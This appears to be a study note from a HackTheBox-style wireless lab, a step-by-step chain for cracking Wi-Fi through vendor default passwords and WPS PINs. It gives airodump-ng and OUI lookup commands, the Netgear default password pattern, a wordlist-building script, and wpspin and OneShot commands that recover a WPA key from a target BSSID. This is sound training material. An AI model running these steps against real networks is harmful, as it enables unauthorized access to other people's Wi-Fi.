# Chain #13: Default Credentials & Vendor-Based Cracking

## Goal & Scope

Exploit vendor default password schemes and WPS PIN logic to access Wi‑Fi networks:

- Identify vendor from SSID/BSSID.
- Apply known default password formats.
- Generate Netgear-style defaults with scripts and tools.
- Explore community resources for default generators.
- Generate and test default WPS PINs with wpspin.

---

## Step 1 — Identify Vendor via Reconnaissance

Run airodump‑ng to collect ESSID and BSSID of target:

```bash
sudo airodump-ng wlan0mon -c 1 --essid HackTheBox-Wifi
```

Use OUI lookup to match vendor from MAC prefix:

```bash
grep -i "9C-C9-EB" /var/lib/ieee-data/oui.txt
```

Output example: `NETGEAR`.

---

## Step 2 — Why Vendor Lookup Matters

- Vendors often use predictable default password patterns.
- Knowing the brand narrows attack strategy.
- WPS algorithms may be vendor‑specific.

---

## Step 3 — Netgear Default Password Pattern

Default: `{adjective}{noun}{3 digits}`.  
Examples:

- `sleeksalamander113`    
- `abandonedelephant556`

This pattern is guessable and exploitable.

---

## Step 4 — Public Netgear Wordlist Repository

Clone curated wordlist:

```bash
git clone https://github.com/LivingInSyn/netgear_hashcat_wordlist.git
cd netgear_hashcat_wordlist/wordlists
```

- Contains prebuilt Netgear‑style wordlists.    
- Optimized for Hashcat use.

---

## Step 5 — Manually Building Netgear Wordlists

Custom Bash script combines adjectives, nouns, numbers:

```bash
#!/bin/bash
wordlist1="adjectives.txt"
wordlist2="nouns.txt"
wordlist3="numbers.txt"
output="Netgear_Default.txt"
> "$output"
while IFS= read -r adj; do
  while IFS= read -r noun; do
    while IFS= read -r num; do
      echo "${adj}${noun}${num}" >> "$output"
    done < "$wordlist3"
  done < "$wordlist2"
done < "$wordlist1"
```

- Flexible for testing different lists.    
- Produces candidates like `brightwolf451`.

---

## Step 6 — Netgear Password Constructinator (NPCinator)

Community tool with larger adjective/noun pools:

```bash
python3 NPCinator.py > passwords.txt
```

- Generates extensive candidate lists.    
- Must limit runtime to avoid gigabytes of output.

---

## Step 7 — Other Default Generators

Useful repos:

- **Smart Password Generator** → Based on salt, MAC, BSSID.    
- **IMEI Generator** → For mobile broadband routers.
- **Time Warner/Spectrum Cracker** → Cable routers.
- **Wifi-WPA-Keyspace-List** → WPA keyspaces by vendor.

Maintain a toolkit of vendor‑specific generators.

---

## Step 8 — WPS Default PINs with wpspin

Generate default WPS PIN:

```bash
wpspin D4:BF:7F:EB:29:D2
```

Generate multiple possible PINs:

```bash
wpspin -A D4:BF:7F:EB:29:D2
```

Examples:

- `77215369` (24‑bit)    
- `68175542` (Realtek)
- `12345670` (Cisco)

---

## Step 9 — Test WPS PIN with OneShot

```bash
python3 oneshot.py -i wlan0mon -b D4:BF:7F:EB:29:D2 -p 99956042
```

If successful:

- Displays `WPS PIN`.    
- Reveals `WPA PSK` and `SSID`.

---

## Checklist

1. Capture target ESSID/BSSID with airodump‑ng.    
2. Perform OUI vendor lookup.
3. Apply known vendor default patterns.
4. Use curated Netgear wordlists or scripts.
5. Optionally use NPCinator for larger lists.
6. Explore vendor default generators.
7. Generate WPS PINs with wpspin.
8. Test with OneShot/Reaver to retrieve PSK.